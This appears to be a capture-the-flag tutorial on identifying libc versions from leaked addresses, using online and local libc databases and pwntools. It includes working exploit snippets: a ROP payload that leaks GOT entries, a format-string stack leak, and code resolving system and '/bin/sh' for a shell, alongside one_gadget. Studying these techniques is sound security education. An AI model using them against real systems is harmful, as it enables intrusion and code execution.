# Libc Database Usage Guide

Detailed guide for identifying libc versions from leaked addresses.

## Why Libc Identification Matters

Different libc versions have:
- Different function offsets
- Different string locations
- Different gadgets
- Different internal structures

Even minor version differences change offsets!

## Method 1: libc.blukat.me (Online)

### Steps
1. Leak 2+ function addresses from GOT
2. Note the last 3 hex digits (12 bits) of each
3. Visit https://libc.blukat.me/
4. Enter function names and offsets
5. Download matching libc

### Example
```
Leaked puts:   0x7f1234567890 → offset: 890
Leaked printf: 0x7f1234512340 → offset: 340

Enter at libc.blukat.me:
  Symbol: puts,   Offset: 890
  Symbol: printf, Offset: 340

Result: libc6_2.31-0ubuntu9_amd64
```

## Method 2: libc-database (Local)

### Installation
```bash
git clone https://github.com/niklasb/libc-database
cd libc-database

# Download libc collections
./get ubuntu    # Ubuntu versions
./get debian    # Debian versions
./get rpm       # RedHat/CentOS
./get all       # Everything (slow, large)
```

### Basic Search
```bash
# Search by symbol offset (last 3 hex digits)
./find puts 890

# Multiple symbols (more accurate)
./find puts 890 printf 340

# Search by build ID
./find buildid <build-id-hex>
```

### Download Identified Libc
```bash
./download libc6_2.31-0ubuntu9_amd64

# Files saved to libs/ directory
ls libs/libc6_2.31-0ubuntu9_amd64/
# libc.so.6  ld-linux-x86-64.so.2
```

### Dump Offsets
```bash
./dump libc6_2.31-0ubuntu9_amd64

# Output:
# offset___libc_start_main_ret = 0x24083
# offset_system = 0x4f550
# offset_dup2 = 0x110ab0
# ...
```

### Add Custom Libc
```bash
./add /path/to/libc.so.6 <identifier>
```

## Method 3: pwntools libcdb

### Online Search
```python
from pwnlib.libcdb import search_by_symbol_offsets

results = search_by_symbol_offsets({
    'puts': 0x875a0,
    'printf': 0x64e80
}, return_as_list=True)

for lib in results:
    print(f"Match: {lib}")
```

### Download from libcdb
```python
from pwnlib.libcdb import search_by_build_id

# If you have the build ID
libc = search_by_build_id(build_id, unstrip=True)
```

## Leaking Addresses for Identification

### Via GOT Leak
```python
def leak_got(func_name):
    """Leak GOT entry using puts."""
    payload = b'A' * OFFSET
    payload += p64(pop_rdi)
    payload += p64(elf.got[func_name])
    payload += p64(elf.plt['puts'])
    payload += p64(elf.symbols['main'])

    io.sendline(payload)
    io.recvuntil(b'\n')

    leak = u64(io.recv(6).ljust(8, b'\x00'))
    log.info(f"{func_name}@libc: {hex(leak)}")
    return leak

# Leak multiple functions
puts_addr = leak_got('puts')
printf_addr = leak_got('printf')
```

### Via Format String
```python
# Leak return addresses from stack
payload = b'%p.' * 50
io.sendline(payload)
leaks = io.recvline().decode().split('.')

# Filter for libc addresses (0x7f range)
for i, leak in enumerate(leaks):
    try:
        addr = int(leak, 16)
        if 0x7f0000000000 <= addr <= 0x7fffffffffff:
            print(f"Offset {i}: {hex(addr)}")
    except:
        pass
```

## Using Identified Libc

### Load in pwntools
```python
libc = ELF('./libc-2.31.so')

# Set base from leak
libc.address = puts_leak - libc.symbols['puts']

# Now all symbols are correct
system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))
```

### Verify Identification
```python
# Check multiple offsets match
assert (puts_leak & 0xfff) == (libc.symbols['puts'] & 0xfff)
assert (printf_leak & 0xfff) == (libc.symbols['printf'] & 0xfff)

# Base should be page-aligned
assert libc.address & 0xfff == 0
```

### Use with one_gadget
```bash
one_gadget ./libc-2.31.so
# Returns offsets to add to libc.address
```

## Common Libc Versions

### Ubuntu
| Version | Libc |
|---------|------|
| 18.04 | 2.27 |
| 20.04 | 2.31 |
| 22.04 | 2.35 |

### Debian
| Version | Libc |
|---------|------|
| 10 (Buster) | 2.28 |
| 11 (Bullseye) | 2.31 |
| 12 (Bookworm) | 2.36 |

## Troubleshooting

### Multiple Matches
- Leak more function addresses
- Check 3+ symbols for unique match

### No Matches
- Verify leak parsing is correct
- Try different offset bits (last 3 vs last 4)
- May be custom/patched libc - request from CTF organizers

### Local Exploit Fails with Identified Libc
```bash
# Patch binary to use correct libc
patchelf --set-interpreter ./ld-2.31.so ./binary
patchelf --set-rpath . ./binary
LD_PRELOAD=./libc-2.31.so ./binary
```

## Quick Reference

```python
# Complete identification flow
def identify_libc(puts_leak, printf_leak):
    # Get offsets
    puts_off = puts_leak & 0xfff
    printf_off = printf_leak & 0xfff

    log.info(f"puts offset: {hex(puts_off)}")
    log.info(f"printf offset: {hex(printf_off)}")
    log.info(f"Search at: https://libc.blukat.me/")
    log.info(f"Or: ./find puts {puts_off:x} printf {printf_off:x}")

    # After identification, load libc
    libc = ELF('./libc-identified.so')
    libc.address = puts_leak - libc.symbols['puts']

    return libc
```
